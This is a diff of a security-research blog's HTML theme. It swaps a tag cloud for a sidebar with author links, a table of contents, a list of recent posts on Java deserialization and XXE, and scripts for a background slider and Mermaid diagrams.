-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/fastjson/" title="fastjson: 6">
-                    <span class="tag-content"
-                        title="fastjson" style="background-color: #F8F9F9;">fastjson
-                        <span class="tag-length">6</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/jackson/" title="jackson: 3">
-                    <span class="tag-content"
-                        title="jackson" style="background-color: #F9EBEA;">jackson
-                        <span class="tag-length">3</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/BCEL/" title="BCEL: 2">
-                    <span class="tag-content"
-                        title="BCEL" style="background-color: #F9E79F;">BCEL
-                        <span class="tag-length">2</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/shiroCommonBeanutils/" title="shiroCommonBeanutils: 1">
-                    <span class="tag-content"
-                        title="shiroCommonBeanutils" style="background-color: #E8F8F5;">shiroCommonBeanutils
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/Shiro/" title="Shiro: 2">
-                    <span class="tag-content"
-                        title="Shiro" style="background-color: #85C1E9;">Shiro
-                        <span class="tag-length">2</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/java%E6%9D%82%E8%AE%BA/" title="java杂论: 2">
-                    <span class="tag-content"
-                        title="java杂论" style="background-color: #F9E79F;">java杂论
-                        <span class="tag-length">2</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/%E7%B1%BB%E5%8A%A0%E8%BD%BD/" title="类加载: 2">
-                    <span class="tag-content"
-                        title="类加载" style="background-color: #85C1E9;">类加载
-                        <span class="tag-length">2</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/JNDI/" title="JNDI: 2">
-                    <span class="tag-content"
-                        title="JNDI" style="background-color: #FEF9E7;">JNDI
-                        <span class="tag-length">2</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="内网渗透: 6">
-                    <span class="tag-content"
-                        title="内网渗透" style="background-color: #F8C471;">内网渗透
-                        <span class="tag-length">6</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/ROME/" title="ROME: 1">
-                    <span class="tag-content"
-                        title="ROME" style="background-color: #FEF9E7;">ROME
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/SnakeYaml/" title="SnakeYaml: 1">
-                    <span class="tag-content"
-                        title="SnakeYaml" style="background-color: #D7BDE2;">SnakeYaml
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/nodejs/" title="nodejs: 2">
-                    <span class="tag-content"
-                        title="nodejs" style="background-color: #82E0AA;">nodejs
-                        <span class="tag-length">2</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/spring/" title="spring: 2">
-                    <span class="tag-content"
-                        title="spring" style="background-color: #D7BDE2;">spring
-                        <span class="tag-length">2</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/struct2/" title="struct2: 1">
-                    <span class="tag-content"
-                        title="struct2" style="background-color: #FFF;">struct2
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/Spring/" title="Spring: 1">
-                    <span class="tag-content"
-                        title="Spring" style="background-color: #F9E79F;">Spring
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/vulnhub/" title="vulnhub: 4">
-                    <span class="tag-content"
-                        title="vulnhub" style="background-color: #D5F5E3;">vulnhub
-                        <span class="tag-length">4</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/weblogic/" title="weblogic: 1">
-                    <span class="tag-content"
-                        title="weblogic" style="background-color: #FFF;">weblogic
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/ysoserial/" title="ysoserial: 1">
-                    <span class="tag-content"
-                        title="ysoserial" style="background-color: #FEF9E7;">ysoserial
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/marshalsec/" title="marshalsec: 1">
-                    <span class="tag-content"
-                        title="marshalsec" style="background-color: #82E0AA;">marshalsec
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/golang/" title="golang: 1">
-                    <span class="tag-content"
-                        title="golang" style="background-color: #FEF9E7;">golang
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/%E7%88%AC%E8%99%AB/" title="爬虫: 1">
-                    <span class="tag-content"
-                        title="爬虫" style="background-color: #D7BDE2;">爬虫
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/" title="机器学习: 1">
-                    <span class="tag-content"
-                        title="机器学习" style="background-color: #E8F8F5;">机器学习
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="python反序列化: 1">
-                    <span class="tag-content"
-                        title="python反序列化" style="background-color: #F9E79F;">python反序列化
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/C/" title="C++: 1">
-                    <span class="tag-content"
-                        title="C++" style="background-color: #85C1E9;">C++
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/aircrack-ng/" title="aircrack-ng: 1">
-                    <span class="tag-content"
-                        title="aircrack-ng" style="background-color: #82E0AA;">aircrack-ng
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-            </div>
-        </div>
+  </div>
+
+  <!-- 目录 -->
+  <aside id='l_side'>
+  
+    
+      <section class="widget side_blogger">
+  <div class='content'>
+    
+      
+        <a class='avatar flat-box rectangle' href='/about/'>
+          <img src='https://pic2.zhimg.com/80/v2-42b72d5ebee4b8d8aa70d9687effe87b_1440w.webp'/>
+        </a>
+      
+    
+    
+      <div class='text'>
+        
+          <h2>Godown_blog</h2>
+        
+        
+          <p>something for nothing</p>
+
+        
+        
+          <p><span id="jinrishici-sentence">Godown_blog</span></p>
+          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+        
+      </div>
+    
+    
+      <div class="social-wrapper">
+        
+          
+            <a href="/atom.xml"
+              class="social fas fa-rss flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="mailto:1958304602@qq.com"
+              class="social fas fa-envelope flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="https://github.com/godownio"
+              class="social fab fa-github flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="tencent://AddContact/?fromId=50&amp;fromSubId=1&amp;subcmd=all&amp;uin=1958304602"
+              class="social fab fa-qq flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+      </div>
+    
+  </div>
+</section>
+
+    
+  
+  
+  
+
+  <div class="layout_sticky">    
+    
+      
+<section class="widget side_toc">
+  
+  <header>
+    
+      <i style="color: " class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name' style="color: ">本文目录</span>
+    
+  </header>
+
+
+  <div class='content'>
+    <div class="toc-main">
+      <div class="toc-content">
+        <!-- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#vulhub%E7%89%88%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">vulhub版环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#QAX-A-Team%E7%89%88%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">QAX-A-Team版环境搭建</span></a></li></ol> -->
+        <div class="toc"></div>
+      </div>
     </div>
+  </div>
+</section>
+<!-- 手机端目录按钮 -->
+<div id="toc-mobile-btn">
+  <i class="fas fa-list-ul" aria-hidden="true"></i>
 </div>
+
+      
+  <section class="widget side_recent_post">
+    
+  <header>
+    
+      <a style="color: " href='/tags/'><i class="fas fa-book fa-fw" aria-hidden="true"></i><span class='name'>最新文章</span></a>
+    
+  </header>
+
+
+    <div class='content'>
+      
+      <!-- hash算法 -->
+      
+      <div class="aside-list">
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2024/11/25/idea-docker-yuan-cheng-diao-shi/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8118.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8118.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">11-25</span>
+                
+              </div>
+              <a class="post-title" href="/2024/11/25/idea-docker-yuan-cheng-diao-shi/">IDEA +docker远程调试weblogic</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2024/11/06/java-xxe/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8117.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8117.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">11-06</span>
+                
+              </div>
+              <a class="post-title" href="/2024/11/06/java-xxe/">论java中的XXE</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2024/10/31/xstream/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8116.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8116.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">10-31</span>
+                
+              </div>
+              <a class="post-title" href="/2024/10/31/xstream/">XStream反序列化合集(Until 1.4.17)</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2024/10/28/snakeyaml/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8115.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8115.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">10-28</span>
+                
+              </div>
+              <a class="post-title" href="/2024/10/28/snakeyaml/">SnakeYaml反序列化分析</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2024/10/28/fastjson-1.2.68-commons-io-xie-wen-jian/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8114.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8114.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">10-28</span>
+                
+              </div>
+              <a class="post-title" href="/2024/10/28/fastjson-1.2.68-commons-io-xie-wen-jian/">fastjson 1.2.68漏洞分析及commons-io写文件</a>
+            </div>
+          </div>
+        
+      </div>
+    </div>
+  </section>
+
+    
+  </div>
+</aside>
+
+  <!-- 图片放大 Wrap images with fancybox support -->
+  <script src="/js/wrapImage.js"></script>
+</div>
+
+<!-- 文章详情页背景图 -->
+<div id="appBgSwiper" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"
+	:style="{'background-color': bgColor ? bgColor : 'transparent'}">
+	<transition-group tag="ul" :name="names">
+		<li v-for='(image,index) in img' :key='index' v-show="index === mark" class="bg-swiper-box">
+			<img :src="image" class="bg-swiper-img no-lazy">
+		</li>
+	</transition-group>
+</div>
+<script>
+	var vm = new Vue({
+		el: '#appBgSwiper',
+		data: {
+			names: '' || 'fade' || 'fade', // translate-fade fade
+			mark: 0,
+			img: [],
+			bgColor: '',
+			time: null
+		},
+		methods: {   //添加方法
+			change(i, m) {
+				if (i > m) {
+					// this.names = 'fade';
+				} else if (i < m) {
+					// this.names = 'fade';
+				} else {
+					return;
+				}
+				this.mark = i;
+			},
+			prev() {
+				// this.names = 'fade';
+				this.mark--;
+				if (this.mark === -1) {
+					this.mark = 3;
+					return
+				}
+			},
+			next() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			autoPlay() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			play() {
+				let bgImgDelay = '' || '180000'
+				let delay = parseInt(bgImgDelay) || 180000;
+				this.time = setInterval(this.autoPlay, delay);
+			},
+			enter() {
+				clearInterval(this.time);
+			},
+			leave() {
+				this.play();
+			}
+		},
+		created() {
+			this.play()
+		},
+		beforeDestroy() {
+			clearInterval(this.time);
+		},
+		mounted() {
+			let prop = '' || '';
+			let isImg = prop.includes('.bmp') || prop.includes('.jpg') || prop.includes('.png') || prop.includes('.tif') || prop.includes('.gif') || prop.includes('.pcx') || prop.includes('.tga') || prop.includes('.exif') || prop.includes('.fpx') || prop.includes('.psd') || prop.includes('.cdr') || prop.includes('.pcd') || prop.includes('.dxf') || prop.includes('.ufo') || prop.includes('.eps') || prop.includes('.ai') || prop.includes('.raw') || prop.includes('.WMF') || prop.includes('.webp') || prop.includes('.jpeg') || prop.includes('http://') || prop.includes('https://')
+			if (isImg) {
+				let img = prop.split(',');
+				let configRoot = '/'
+				let arrImg = [];
+				img.forEach(el => {
+					var Expression = /http(s)?:\/\/([\w-]+\.)+[\w-]+(\/[\w- .\/?%&=]*)?/;
+					var objExp = new RegExp(Expression);
+
+					if (objExp.test(el)) {
+						// http or https
+						arrImg.push(el);
+					} else {
+						// 非http or https开头
+						// 本地文件
+						let firstStr = el.charAt(0);
+						if (firstStr == '/') {
+							el = el.substr(1); // 删除第一个字符 '/',因为 configRoot最后一个字符为 /
+						}
+						el = configRoot + el;
+						arrImg.push(el);
+					}
+				})
+				this.img = arrImg;
+			} else {
+				this.bgColor = prop;
+			}
+		}
+	})
+</script>
+
+<style>
+	.bg-swiper-box {
+		position: absolute;
+		display: block;
+		width: 100%;
+		height: 100%;
+	}
+
+	.bg-swiper-img {
+		object-fit: cover;
+		width: 100%;
+		height: 100%;
+	}
+</style>
+
+
+
+
+  <script>
+  function loadMermaid() {
+    if (document.getElementsByClassName('mermaid').length) {
+      if (window.mermaidJsLoad) mermaid.init()
+      else {
+        loadScript('https://unpkg.com/mermaid/dist/mermaid.min.js').then(() => {
+          window.mermaidJsLoad = true
+          mermaid.initialize({
+            theme: 'default',
+          })
+          if ('true') {
+            mermaid.init();
+          }
+        })
+      }
+    }
+  };
+  document.addEventListener("DOMContentLoaded", function () {
+    loadMermaid();
+  })
+
+  document.addEventListener('pjax:complete', function () {
+    loadMermaid();
+  })
+  
+</script>
+
 
       </main>
     </div>
